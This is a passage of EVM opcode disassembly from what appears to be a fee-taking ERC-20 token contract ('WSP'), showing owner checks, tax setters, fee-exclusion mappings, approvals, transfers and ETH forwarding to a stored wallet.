SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH2 0xCC4 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xCE2 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xD58 JUMPI POP PUSH2 0xD07 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0xD97 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD8E SWAP1 PUSH2 0x31C0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xF PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xA64373A629BC0C09EACF8A9CC2C7B070FA0A8B7E2E9B8AAEE408A3C02EB1676B PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH1 0xF PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x5 PUSH1 0x0 PUSH1 0xF PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x5753500000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0xF3F PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xF5D PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xFD3 JUMPI POP PUSH2 0xF82 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0x1012 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1009 SWAP1 PUSH2 0x31C0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0xB DUP5 LT PUSH2 0x1055 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x104C SWAP1 PUSH2 0x3298 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0xB DUP4 LT PUSH2 0x1098 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x108F SWAP1 PUSH2 0x3298 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x7 DUP3 LT PUSH2 0x10DB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x10D2 SWAP1 PUSH2 0x3304 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x7 DUP2 LT PUSH2 0x111E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1115 SWAP1 PUSH2 0x3304 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP4 PUSH1 0x8 DUP2 SWAP1 SSTORE POP DUP3 PUSH1 0xA DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x9 DUP2 SWAP1 SSTORE POP DUP1 PUSH1 0xB DUP2 SWAP1 SSTORE POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1154 PUSH2 0x114D PUSH2 0x17C9 JUMP JUMPDEST DUP5 DUP5 PUSH2 0x199A JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1166 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x1184 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x11FA JUMPI POP PUSH2 0x11A9 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0x1239 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1230 SWAP1 PUSH2 0x31C0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xFBBC329437E8C79F847E170730AD6DD04106B7511CAD70D06D635886D92DE83C PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH1 0xE PUSH1 0x1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x5 PUSH1 0x0 PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x13B4 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x142A JUMPI POP PUSH1 0xF PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x1412 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST DUP1 PUSH2 0x146E JUMPI POP PUSH2 0x1438 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x1456 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0x1477 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1482 ADDRESS PUSH2 0xB18 JUMP JUMPDEST SWAP1 POP PUSH2 0x148D DUP2 PUSH2 0x20DE JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x1498 PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1525 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x151C SWAP1 PUSH2 0x322C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP4 SWAP1 POP DUP2 LT ISZERO PUSH2 0x15C4 JUMPI DUP2 PUSH1 0x5 PUSH1 0x0 DUP7 DUP7 DUP6 DUP2 DUP2 LT PUSH2 0x154B JUMPI PUSH2 0x154A PUSH2 0x3324 JUMP JUMPDEST JUMPDEST SWAP1 POP PUSH1 0x20 MUL ADD PUSH1 0x20 DUP2 ADD SWAP1 PUSH2 0x1560 SWAP2 SWAP1 PUSH2 0x2DBA JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP DUP1 DUP1 PUSH2 0x15BC SWAP1 PUSH2 0x3382 JUMP JUMPDEST SWAP2 POP POP PUSH2 0x1528 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x13 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x4 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x167F PUSH2 0x17C9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x170C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1703 SWAP1 PUSH2 0x322C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x1840 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1837 SWAP1 PUSH2 0x343C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x18AF JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x18A6 SWAP1 PUSH2 0x34CE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x4 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD PUSH2 0x198D SWAP2 SWAP1 PUSH2 0x2C56 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x1A09 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A00 SWAP1 PUSH2 0x3030 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x1A78 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A6F SWAP1 PUSH2 0x30C2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP2 GT PUSH2 0x1ABB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1AB2 SWAP1 PUSH2 0x3154 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1AC3 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO DUP1 ISZERO PUSH2 0x1B31 JUMPI POP PUSH2 0x1B01 PUSH2 0xED1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO JUMPDEST ISZERO PUSH2 0x1EF1 JUMPI PUSH1 0x0 PUSH2 0x1B48 PUSH2 0x1B43 PUSH2 0xED1 JUMP JUMPDEST PUSH2 0xB18 JUMP JUMPDEST SWAP1 POP PUSH1 0x14 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO DUP1 ISZERO PUSH2 0x1BB3 JUMPI POP PUSH1 0x14 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x1BCB JUMPI POP PUSH1 0x14 PUSH1 0x15 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND JUMPDEST DUP1 ISZERO PUSH2 0x1BD7 JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST ISZERO PUSH2 0x1BFF JUMPI PUSH2 0x1BE5 DUP2 PUSH2 0x20DE JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP PUSH1 0x0 DUP2 GT ISZERO PUSH2 0x1BFD JUMPI PUSH2 0x1BFC SELFBALANCE PUSH2 0x1F75 JUMP JUMPDEST JUMPDEST POP JUMPDEST PUSH1 0x14 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 ISZERO PUSH2 0x1CAA JUMPI POP PUSH1 0x11 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO JUMPDEST ISZERO PUSH2 0x1CC2 JUMPI PUSH1 0x8 SLOAD PUSH1 0xC DUP2 SWAP1 SSTORE POP PUSH1 0x9 SLOAD PUSH1 0xD DUP2 SWAP1 SSTORE POP JUMPDEST PUSH1 0x14 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 ISZERO PUSH2 0x1D6D JUMPI POP PUSH1 0x11 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO JUMPDEST ISZERO PUSH2 0x1D85 JUMPI PUSH1 0xA SLOAD PUSH1 0xC DUP2 SWAP1 SSTORE POP PUSH1 0xB SLOAD PUSH1 0xD DUP2 SWAP1 SSTORE POP JUMPDEST PUSH1 0x5 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP1 PUSH2 0x1E26 JUMPI POP PUSH1 0x5 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND JUMPDEST DUP1 PUSH2 0x1ED9 JUMPI POP PUSH1 0x14 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO DUP1 ISZERO PUSH2 0x1ED8 JUMPI POP PUSH1 0x14 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO JUMPDEST JUMPDEST ISZERO PUSH2 0x1EEF JUMPI PUSH1 0x0 PUSH1 0xC DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0xD DUP2 SWAP1 SSTORE POP JUMPDEST POP JUMPDEST PUSH2 0x1EFC DUP4 DUP4 DUP4 PUSH2 0x1F65 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0x1F49 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1F40 SWAP2 SWAP1 PUSH2 0x2A97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 PUSH2 0x1F58 SWAP2 SWAP1 PUSH2 0x34EE JUMP JUMPDEST SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x1F70 DUP4 DUP4 DUP4 PUSH2 0x235C JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0xE PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x1FC5 PUSH1 0x2 DUP5 PUSH2 0x2527 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x1FF0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0xF PUSH1 0x0 SWAP1 SLOAD SWAP1 